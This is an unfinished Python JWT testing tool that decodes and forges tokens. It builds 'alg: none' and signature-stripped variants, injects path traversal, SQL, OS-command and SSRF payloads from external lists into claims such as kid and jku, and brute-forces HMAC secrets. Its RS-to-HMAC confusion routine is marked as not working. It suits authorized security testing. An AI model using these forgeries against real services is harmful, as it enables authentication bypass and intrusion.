import argparse
import jwt
import json            # for JWT encoding
import re              # regular expression for sign stripping
import base64    # None alg


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-tok", "--token", help = "Specify your JWT using one of this parameters")
    parser.add_argument("-sec", "--secret", help = "Use this options for HS256,HS384,HS512 algorithms")
    parser.add_argument("-pub", "--public", help = "Specify path to a .txt file, which contains your public key, from your current location")
    parser.add_argument("-priv", "--private", help = "Specify path to a .txt file, which contains your private key, from your current location")
    parser.add_argument("-re", "--rsa-encode", help = "Pass algorithm type?????????????!!!!!!")
    parser.add_argument("-he", "--hs-encode", help = "Pass algorithm type?????????????!!!!!!")
    parser.add_argument("-p", "--payl", help = "")
    parser.add_argument("-d", "--decode", action="store_true" , help = "Decode JWT")
    parser.add_argument("-er", "--errors", action="store_true" ,help = "")
    parser.add_argument("-ss", "--sign-stripping", action="store_true" ,help = "")
    parser.add_argument("-an", "--alg-none", action="store_true" ,help = "")
    parser.add_argument("-pt", "--path-traversal", action="store_true" ,help = "")
    parser.add_argument("-si", "--sqli", action="store_true" ,help = "")
    parser.add_argument("-os", "--osi", action="store_true" ,help = "")
    parser.add_argument("-rf", "--ssrf", action="store_true" ,help = "")
    parser.add_argument("-bh", "--brute-hmac", action="store_true" ,help = "")
    return parser.parse_args()

def base64_url_encode(payload):                 # not mine    
    base64_payl = base64.b64encode(json.dumps(payload,separators=(",",":")).encode()).decode('UTF-8').strip("=")        # encode into base64 using json.dumps which transform data as we need
    return base64_payl

def hs_validation(token, header, headers, secret):
    decoded_jwt = jwt.decode(token, key=secret, algorithms=[header, ])
    print("\n", headers)
    print(decoded_jwt)    

def rs_validation(token, header, headers, public_key):
    decoded_jwt = jwt.decode(token, public_key, algorithms=[header, ])
    print("\n", headers)
    print(decoded_jwt)

def read_public_key(path_to_public_key):
    with open(path_to_public_key) as f:
        public_key = f.read()
        return public_key

def read_private_key(path_to_private_key):
    with open(path_to_private_key) as f:
        private_key = f.read()
        return private_key

def encode_using_rs(payload, private_key, header):
    payload = json.loads(payload)
    encoded_jwt = jwt.encode(payload, private_key, header)
    print("\n", str(encoded_jwt, 'utf-8'))                  # convert from bytes to string

def encode_using_hs(payload, secret, header):
    payload = json.loads(payload)
    encoded_jwt = jwt.encode(payload, secret, header)
    print("\n", str(encoded_jwt, 'utf-8'))

def validateJSON(payload):
    try:
        json.loads(payload)
    except ValueError as err:
        return False
    return True

def show_me_errors(token):
    for x in range(4):
        token+="="
        print("\nTokens with 1-4 additional equal signs:\n", token)
    token = token.replace("====", "")
    token+="Asdgrm"
    print("\nToken with additional text at the end:\n", token)
    token = "Akjher" + token
    print("\nToken with additional text at the start and at the end:\n", token)
    token = token[6:-6]
    token+="%3C%3E"
    print("\nToken with bad characters at the end:\n", token)
    token = "%27" + token
    print("\nToken with bad characters at the start and at the end:\n", token)
    bad_token = token[3:-9]
    print("\nToken with reduced signature part:\n", bad_token)
    bad_token = token[6:-6]
    print("\nToken with reduced header part:\n", bad_token)

def signature_stripping(token):
    index = token.rfind(".")
    bad_token = token[:index]
    print(bad_token)
    bad_token = bad_token + "."
    print("\nToken with stripped signature with a dot at the end:\n\n", bad_token)

def alg_none(token, headers):
    #print(jwt.get_unverified_header(token)['alg'])
    #jwt.get_unverified_header(token)['alg'] = "None"  # different None none nOne
    algs = ["None", "none", "nOne", "noNe", "nonE", "NoNe", "NONE", "N0NE"]
    print("\nTokens with these alg types: \n[\"None\", \"none\", \"nOne\", \"noNe\", \"nonE\", \"NoNe\", \"NONE\", \"N0NE\"]")
    for x in algs:
        headers["alg"] = x
        head = base64_url_encode(headers)
        index = token.find(".")
        token = token[index:]
        token = head + token
        print("\n", token)

def path_trav(token, key, header_alg):                      #it would be much better to output                                  
    file_with_payloads = "path_traversal.txt"               #result into file, it takes too much
    with open(file_with_payloads) as f:                     #space in terminal. It also would be cool to provide way for user to include his headers 
        payload = f.readlines()   
    index = token.find(".")
    #header = token[:index]
    #body = jwt.decode(token, options={"verify_signature": False})
    names = ["iss", "sub", "aud", "exp", "kid", "jku", "jti", "user", "role", "Ahewa", "x5u", "x5c"]
    if header_alg == 'RS256' or header_alg == 'RS384' or header_alg == 'RS512':
        key = read_private_key(key)
    for i in range(0, len(names)):
        for y in payload:
            body = jwt.decode(token, options={"verify_signature": False})
            test = {names[i]:y.replace("\n","")}
            body.update(test)
            body = json.dumps(body)                 # convert dict to str
            print("\n", names[i], " :: ", y)
            if header_alg == 'HS256' or header_alg == 'HS384' or header_alg == 'HS512':
                encode_using_hs(body, key, header_alg)
            elif header_alg == 'RS256' or header_alg == 'RS384' or header_alg == 'RS512':
                encode_using_rs(body, key, header_alg)
            else:
                exit("We encountered some problem with the name of your algorihm, please, recheck it, every space is important!")
            


def sqli(token, key, header_alg):                   #it would be much better to output                                  
    file_with_payloads = "sqli.txt"                 #result into file, it takes too much
    with open(file_with_payloads) as f:             #space in terminal. It also would be cool to provide way for user to include his headers 
        payload = f.readlines()   
    index = token.find(".")
    #header = token[:index]
    #body = jwt.decode(token, options={"verify_signature": False})
    names = ["iss", "sub", "aud", "exp", "kid", "jku", "jti", "user", "role", "Ahewa", "x5u", "x5c"]
    if header_alg == 'RS256' or header_alg == 'RS384' or header_alg == 'RS512':
        key = read_private_key(key)
    for i in range(0, len(names)):
        for y in payload:
            body = jwt.decode(token, options={"verify_signature": False})
            test = {names[i]:y.replace("\n","")}
            body.update(test)
            body = json.dumps(body)                 # convert dict to str
            print("\n", names[i], " :: ", y)
            if header_alg == 'HS256' or header_alg == 'HS384' or header_alg == 'HS512':
                encode_using_hs(body, key, header_alg)
            elif header_alg == 'RS256' or header_alg == 'RS384' or header_alg == 'RS512':
                encode_using_rs(body, key, header_alg)
            else:
                exit("We encountered some problem with the name of your algorihm, please, recheck it, every space is important!")

def osi(token, key, header_alg):                   #it would be much better to output                                  
    file_with_payloads = "osi.txt"                 #result into file, it takes too much
    with open(file_with_payloads) as f:             #space in terminal. It also would be cool to provide way for user to include his headers 
        payload = f.readlines()   
    index = token.find(".")
    #header = token[:index]
    #body = jwt.decode(token, options={"verify_signature": False})
    names = ["iss", "sub", "aud", "exp", "kid", "jku", "jti", "user", "role", "Ahewa", "x5u", "x5c"]
    if header_alg == 'RS256' or header_alg == 'RS384' or header_alg == 'RS512':
        key = read_private_key(key)
    for i in range(0, len(names)):
        for y in payload:
            body = jwt.decode(token, options={"verify_signature": False})
            test = {names[i]:y.replace("\n","")}
            body.update(test)
            body = json.dumps(body)                 # convert dict to str
            print("\n", names[i], " :: ", y)
            if header_alg == 'HS256' or header_alg == 'HS384' or header_alg == 'HS512':
                encode_using_hs(body, key, header_alg)
            elif header_alg == 'RS256' or header_alg == 'RS384' or header_alg == 'RS512':
                encode_using_rs(body, key, header_alg)
            else:
                exit("We encountered some problem with the name of your algorihm, please, recheck it, every space is important!")

def ssrf(token, key, header_alg):                   #it would be much better to output                                  
    file_with_payloads = "ssrf.txt"                 #result into file, it takes too much
    with open(file_with_payloads) as f:             #space in terminal. It also would be cool to provide way for user to include his headers 
        payload = f.readlines()   
    index = token.find(".")
    #header = token[:index]
    #body = jwt.decode(token, options={"verify_signature": False})
    names = ["iss", "sub", "aud", "exp", "kid", "jku", "jti", "user", "role", "Ahewa", "x5u", "x5c"]
    if header_alg == 'RS256' or header_alg == 'RS384' or header_alg == 'RS512':
        key = read_private_key(key)
    for i in range(0, len(names)):
        for y in payload:
            body = jwt.decode(token, options={"verify_signature": False})
            test = {names[i]:y.replace("\n","")}
            body.update(test)
            body = json.dumps(body)                 # convert dict to str
            print("\n", names[i], " :: ", y)
            if header_alg == 'HS256' or header_alg == 'HS384' or header_alg == 'HS512':
                encode_using_hs(body, key, header_alg)
            elif header_alg == 'RS256' or header_alg == 'RS384' or header_alg == 'RS512':
                encode_using_rs(body, key, header_alg)
            else:
                exit("We encountered some problem with the name of your algorihm, please, recheck it, every space is important!")

def brute_hmac(token, header_alg):
    index = token.rfind(".")
    new_token = token[:index]
    new_token = new_token + "."

    body = jwt.decode(new_token, options={"verify_signature": False})
    body = json.dumps(body)

    with open("hmac_secrets.txt") as f:              
        hmac_secret = f.readlines()

    for key in hmac_secret:
        encode_using_hs(body, key, header_alg)              # it can be done using
                                                    # multithreading, but in this case
                                                    # i need to change encode_hs() method
                                                    # to return result, not to print it
                                                    # and then i would be able to constract
                                                    # two lists of results, at the end
                                                    # concatanate them, print to terminal
                                                    # and you have beautiful list two times faster!!!
    

def rs_to_hmac(token, cert):                # DONT WORK!!!
    header_alg = jwt.get_unverified_header(token)['alg']          
    body = jwt.decode(token, options={"verify_signature": False})
    body = json.dumps(body)

    os.system("openssl x509 -in cert.pem -pubkey -noout > key.pem")
    os.system('cat key.pem | xxd -p | tr -d "\\n"')
    
    encode_using_hs(body, cert, "HS256")
    

def main(args):
    '''
    if os.geteuid() != 0:
        exit("This tool needs root privileges!")
    '''

    '''
    if args.summary is not None:
        numbers = args.summary
        numb = numbers.split(',')
        print(numb)
    '''

    print("\nProcessing..\n\n")


#   Maybe i can add if statement for all possible functions, for example:
#   if we want to encode using RS, we check this: if args.private is not None: +
#   if args.rsa_encode is not None: and so on, in this way, we will need only parameters
#   that will be used in our functions and not some others.

    # PARAMETERS
    if args.token is not None:
        token = args.token
        headers = jwt.get_unverified_header(token)          # read headers without validation
        print("JWT headers:\n", headers)
        print("\nJWT payload:\n", jwt.decode(token, options={"verify_signature": False}))   # Read payload without decoding
        header_alg = jwt.get_unverified_header(token)['alg']
    else:
        #exit("[Error!] - Please, specify token using \"-tok\" or \"--token\"\n")
        # return here later! when this check is really needed?!
        print('.')  # erase later!!!

    if args.public is not None:
        path_to_public_key = args.public
        print("Public key is processed!")

    if args.private is not None:
        path_to_private_key = args.private
        print("Private key is processed!")

    if args.payl is not None:
        payload = args.payl

    if args.rsa_encode is not None:                 # Encode JWT using RSA
        header_alg = args.rsa_encode
        if validateJSON(payload):
            private_key = read_private_key(path_to_private_key)
            encode_using_rs(payload, private_key, header_alg)
        else:
            exit("Invalid JSON format of JWT payload.")

    if args.hs_encode is not None:                 # Encode JWT using HS
        if args.secret is not None:
            secret = args.secret
        else:
            exit("[Error!] - Please, specify for token validation")
        header_alg = args.hs_encode
        if validateJSON(payload):
            encode_using_hs(payload, secret, header_alg)
        else:
            exit("Invalid JSON format of JWT payload.")
            

    if args.decode is not False:                     # Decode JWT
        # Decode supported token
        if header_alg == 'HS256' or header_alg == 'HS384' or header_alg == 'HS512':
            if args.secret is not None:
                secret = args.secret
            else:
                exit("[Error!] - Please, specify for token validation")
            hs_validation(token, header_alg, headers, secret)
        elif header_alg == 'RS256' or header_alg == 'RS384' or header_alg == 'RS512':
            public_key = read_public_key(path_to_public_key)
            rs_validation(token, header_alg, headers, public_key)
        elif header_alg == 'ES256' or header_alg == 'ES384' or header_alg == 'ES512' or header_alg == 'PS256' or header_alg == 'PS384' or header_alg == 'PS512':
            exit("Unfortunately, current version does not support this algorithm")
        else:
            exit("We encountered some problem with the name of your algorihm, please, recheck it, every space is important!")
                       
    if args.errors is not False:                 # [3] Cause some errors
        print("\nBad formed tokens:\n")
        show_me_errors(token)

    if args.sign_stripping is not False:         # [4] Strip  sign
        print("\nToken with stripped signature without a dot at the end:\n")
        signature_stripping(token)

    if args.alg_none is not False:               # [5] Alg None
        alg_none(token, headers)

    if args.path_traversal is not False:
        if args.secret is not None:
            secret = args.secret
        elif args.private is not None:
            secret = args.private
        else:
            exit("[Error!] - Please, specify secret for creating token!")
        print("\nPayloads for path traversal:")
        path_trav(token, secret, header_alg)

    if args.sqli is not False:
        if args.secret is not None:
            secret = args.secret
        elif args.private is not None:
            secret = args.private
        else:
            exit("[Error!] - Please, specify secret for creating token!")
        print("\nPayloads for SQLi:")
        sqli(token, secret, header_alg)

    if args.osi is not False:
        if args.secret is not None:
            secret = args.secret
        elif args.private is not None:
            secret = args.private
        else:
            exit("[Error!] - Please, specify secret for creating token!")
        print("\nPayloads for OSi:")
        osi(token, secret, header_alg)

    if args.ssrf is not False:
        if args.secret is not None:
            secret = args.secret
        elif args.private is not None:
            secret = args.private
        else:
            exit("[Error!] - Please, specify secret for creating token!")
        print("\nPayloads for SSRF:")
        ssrf(token, secret, header_alg)

    if args.brute_hmac is not False:
        brute_hmac(token, header_alg)






        
    # Extract alg name from the header
    

    rs_to_hmac(token, path_to_public_key)       # DONT WORK!




main(parse_args())



    




'''
It also would be cool to optimise code for sqli, path trav, OSi and ssrf
because its basically the same code, i can rewrite it.

At the end i can also implement functionality to send jwt to website!


Check if creating/editing works properly


Supports only HS and RS algorithms!!!

Think about workflow, how it will work (depends on param)

if there will be enough time, i can add functionality to encode/decode rs256 with passphrase
dont know how useful it will be, but it can be done.


Maybe it will be useful to add url encoding!?



  I also can describe all vulns that i found at medium, maybe it can be a guide
  or a guide too + an article


if we cant do smth at the tool level, provide info+resources for manual exploration

'''







    #token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.XbPfbIHMI6arZ3Y922BhjWgQzWXcXNrz0ogtVhfEd2o'
    #print(jwt.get_unverified_header(token))  # output header
    #print(jwt.get_unverified_header(token)['alg'])  # output alg's value
    #alg = jwt.get_unverified_header(token)['alg']
    #print(alg)



    #HS Encode JWT: jwt.encode({"some":"payload"}, "secret", algorithm="HS256")
    #RS jwt.encode({"some":"payload"}, private_key, algorithm="HS256")

    


    #print(jwt.decode(token, key='secret', algorithms=['HS256', ]))  # decode hs256

    #jwt.decode(token, key='secret', algorithms=['RS256', ])  # decode rs256

    #print(type(jwt.get_unverified_header(token)))
